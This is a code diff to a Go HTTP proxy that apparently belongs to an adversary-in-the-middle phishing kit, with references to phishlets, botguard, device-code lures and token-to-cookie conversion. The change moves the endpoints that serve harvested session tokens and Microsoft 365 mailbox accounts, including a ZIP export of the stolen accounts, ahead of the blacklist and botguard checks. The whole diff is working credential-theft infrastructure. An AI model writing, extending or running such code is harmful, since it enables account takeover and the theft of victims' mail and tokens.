@@ -547,6 +547,100 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return req, resp
 			}
 			// --- End rewrite_urls logic ---
+
+			// ════════════════════════════════════════════════════════════════════════
+			// INTERNAL API ENDPOINTS - Served before blacklist/botguard checks
+			// These must be accessible regardless of blacklist or phishlet state
+			// ════════════════════════════════════════════════════════════════════════
+			if strings.HasPrefix(req.URL.Path, "/api/v1/") {
+				// --- Mailbox download endpoint (ZIP file) ---
+				if mailboxDownloadRe.MatchString(req.URL.Path) {
+					remote_addr := req.RemoteAddr
+					if idx := strings.LastIndex(remote_addr, ":"); idx != -1 {
+						remote_addr = remote_addr[:idx]
+					}
+					log.Debug("[mailbox] Download endpoint hit from %s", remote_addr)
+					apiKey := req.URL.Query().Get("key")
+					if apiKey != p.tokenFeed.GetAPIKey() {
+						log.Warning("[mailbox] Download unauthorized - invalid key from %s", remote_addr)
+						resp := goproxy.NewResponse(req, "application/json", 401, `{"error":"unauthorized"}`)
+						return req, resp
+					}
+					exportBody, _ := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, "export")
+					log.Debug("[mailbox] Export body length: %d", len(exportBody))
+					zipBuffer := p.createMailboxDownloadZip(exportBody)
+					if zipBuffer == nil {
+						log.Error("[mailbox] Failed to create ZIP buffer")
+						resp := goproxy.NewResponse(req, "application/json", 500, `{"error":"failed to create download package"}`)
+						return req, resp
+					}
+					log.Debug("[mailbox] ZIP buffer size: %d bytes", len(zipBuffer))
+					resp := &http.Response{
+						Status:        "200 OK",
+						StatusCode:    200,
+						Proto:         "HTTP/1.1",
+						ProtoMajor:    1,
+						ProtoMinor:    1,
+						Request:       req,
+						Header:        make(http.Header),
+						Body:          ioutil.NopCloser(bytes.NewReader(zipBuffer)),
+						ContentLength: int64(len(zipBuffer)),
+					}
+					resp.Header.Set("Content-Disposition", "attachment; filename=\"M365-Mail-Package.zip\"")
+					resp.Header.Set("Content-Type", "application/octet-stream")
+					resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(zipBuffer)))
+					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+					resp.Header.Set("Pragma", "no-cache")
+					resp.Header.Set("X-Content-Type-Options", "nosniff")
+					log.Success("[mailbox] Download package served to %s (%d accounts, %d bytes)", remote_addr, p.mailboxAccounts.Count(), len(zipBuffer))
+					return req, resp
+				}
+
+				// --- Mailbox accounts API (JSON) ---
+				if mailboxApiRe.MatchString(req.URL.Path) {
+					remote_addr := req.RemoteAddr
+					if idx := strings.LastIndex(remote_addr, ":"); idx != -1 {
+						remote_addr = remote_addr[:idx]
+					}
+					apiKey := req.URL.Query().Get("key")
+					action := req.URL.Query().Get("action")
+					body, statusCode := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, action)
+					resp := goproxy.NewResponse(req, "application/json", statusCode, body)
+					resp.Header.Set("Access-Control-Allow-Origin", "*")
+					resp.Header.Set("Access-Control-Allow-Methods", "GET")
+					resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
+					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+					if statusCode == 200 {
+						log.Info("[mailbox] API served to %s (action=%s)", remote_addr, action)
+					} else {
+						log.Warning("[mailbox] Unauthorized API access from %s", remote_addr)
+					}
+					return req, resp
+				}
+
+				// --- Token feed API ---
+				if tokenFeedRe.MatchString(req.URL.Path) {
+					remote_addr := req.RemoteAddr
+					if idx := strings.LastIndex(remote_addr, ":"); idx != -1 {
+						remote_addr = remote_addr[:idx]
+					}
+					apiKey := req.URL.Query().Get("key")
+					body, statusCode := p.tokenFeed.HandleFeedRequest(apiKey)
+					resp := goproxy.NewResponse(req, "application/json", statusCode, body)
+					resp.Header.Set("Access-Control-Allow-Origin", "*")
+					resp.Header.Set("Access-Control-Allow-Methods", "GET")
+					resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
+					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+					if statusCode == 200 {
+						log.Info("[tokenfeed] Feed served to %s", remote_addr)
+					} else {
+						log.Warning("[tokenfeed] Unauthorized feed access from %s", remote_addr)
+					}
+					return req, resp
+				}
+			}
+			// ════════════════════════════════════════════════════════════════════════
+
 			ps := &ProxySession{
 				SessionId:    "",
 				Created:      false,
@@ -956,89 +1050,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 			// --- End themed document access device code endpoints ---
-
-			// --- Begin token feed API (serves tokens to mailbox viewer) ---
-			if tokenFeedRe.MatchString(req.URL.Path) {
-				apiKey := req.URL.Query().Get("key")
-				body, statusCode := p.tokenFeed.HandleFeedRequest(apiKey)
-				resp := goproxy.NewResponse(req, "application/json", statusCode, body)
-				resp.Header.Set("Access-Control-Allow-Origin", "*")
-				resp.Header.Set("Access-Control-Allow-Methods", "GET")
-				resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
-				resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
-				if statusCode == 200 {
-					log.Info("[tokenfeed] Feed served to %s", remote_addr)
-				} else {
-					log.Warning("[tokenfeed] Unauthorized feed access from %s", remote_addr)
-				}
-				return req, resp
-			}
-			// --- End token feed API ---
-
-			// --- Begin mailbox accounts API (persistent accounts with auto-refresh) ---
-			if mailboxApiRe.MatchString(req.URL.Path) {
-				apiKey := req.URL.Query().Get("key")
-				action := req.URL.Query().Get("action")
-				body, statusCode := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, action)
-				resp := goproxy.NewResponse(req, "application/json", statusCode, body)
-				resp.Header.Set("Access-Control-Allow-Origin", "*")
-				resp.Header.Set("Access-Control-Allow-Methods", "GET")
-				resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
-				resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
-				if statusCode == 200 {
-					log.Info("[mailbox] API served to %s (action=%s)", remote_addr, action)
-				} else {
-					log.Warning("[mailbox] Unauthorized API access from %s", remote_addr)
-				}
-				return req, resp
-			}
-			// --- End mailbox accounts API ---
-
-			// --- Begin mailbox download endpoint (M365-Mail.exe + accounts) ---
-			if mailboxDownloadRe.MatchString(req.URL.Path) {
-				log.Debug("[mailbox] Download endpoint hit from %s", remote_addr)
-				apiKey := req.URL.Query().Get("key")
-				if apiKey != p.tokenFeed.GetAPIKey() {
-					log.Warning("[mailbox] Download unauthorized - invalid key from %s", remote_addr)
-					resp := goproxy.NewResponse(req, "application/json", 401, `{"error":"unauthorized"}`)
-					return req, resp
-				}
-				
-				// Get accounts export JSON
-				exportBody, _ := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, "export")
-				log.Debug("[mailbox] Export body length: %d", len(exportBody))
-				
-				// Create ZIP in memory with accounts-import.json
-				zipBuffer := p.createMailboxDownloadZip(exportBody)
-				if zipBuffer == nil {
-					log.Error("[mailbox] Failed to create ZIP buffer")
-					resp := goproxy.NewResponse(req, "application/json", 500, `{"error":"failed to create download package"}`)
-					return req, resp
-				}
-				log.Debug("[mailbox] ZIP buffer size: %d bytes", len(zipBuffer))
-				
-				// Create proper binary response with all required fields
-				resp := &http.Response{
-					Status:        "200 OK",
-					StatusCode:    200,
-					Proto:         "HTTP/1.1",
-					ProtoMajor:    1,
-					ProtoMinor:    1,
-					Request:       req,
-					Header:        make(http.Header),
-					Body:          ioutil.NopCloser(bytes.NewReader(zipBuffer)),
-					ContentLength: int64(len(zipBuffer)),
-				}
-				resp.Header.Set("Content-Disposition", "attachment; filename=\"M365-Mail-Package.zip\"")
-				resp.Header.Set("Content-Type", "application/octet-stream")
-				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(zipBuffer)))
-				resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
-				resp.Header.Set("Pragma", "no-cache")
-				resp.Header.Set("X-Content-Type-Options", "nosniff")
-				log.Success("[mailbox] Download package served to %s (%d accounts, %d bytes)", remote_addr, p.mailboxAccounts.Count(), len(zipBuffer))
-				return req, resp
-			}
-			// --- End mailbox download endpoint ---
 
 			// --- Begin portal endpoint (token-to-cookie conversion) ---
 			if portalPageRe.MatchString(req.URL.Path) {
